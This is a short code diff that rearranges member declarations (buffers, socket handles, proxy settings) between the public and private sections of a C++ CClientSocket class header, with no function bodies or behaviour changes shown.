@@ -78,15 +78,6 @@ public:
 	virtual ~CClientSocket();
 
 public:
-	CBuffer m_CompressionBuffer;
-	CBuffer m_DeCompressionBuffer;
-	CBuffer m_WriteBuffer;
-	CBuffer	m_ResendWriteBuffer;
-
-	HANDLE m_hRecvWorkerThread;
-	SOCKET m_Socket;
-	HANDLE m_hEvent;
-
 	bool Connect(LPCTSTR lpszHost, UINT nPort);
 	void Disconnect();
 
@@ -100,19 +91,30 @@ public:
 	bool IsRunning();
 
 private:
-	bool m_bIsRunning;
-	CManager	*m_pManager;
-	BYTE m_byPacketFlag[FLAG_SIZE];
-
-	static int  m_nProxyType;
-	static char m_strProxyHost[256];
-	static UINT m_nProxyPort;
-	static char m_strUserName[256];
-	static char m_strPassWord[256];
-
-private:
 	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
 
 	bool ConnectProxyServer(LPCTSTR lpszHost, UINT nPort);
 	static DWORD WINAPI WorkThread(LPVOID lparam);
+
+public:
+	CBuffer m_CompressionBuffer;
+	CBuffer m_DeCompressionBuffer;
+	CBuffer m_WriteBuffer;
+	CBuffer	m_ResendWriteBuffer;
+
+	HANDLE m_hRecvWorkerThread;
+	SOCKET m_Socket;
+	HANDLE m_hEvent;
+
+private:
+	CManager* m_pManager;
+
+	bool m_bIsRunning;
+	BYTE m_byPacketFlag[FLAG_SIZE];
+
+	static int  m_nProxyType;
+	static UINT m_nProxyPort;
+	static char m_strProxyHost[256];
+	static char m_strUserName[256];
+	static char m_strPassWord[256];
 };
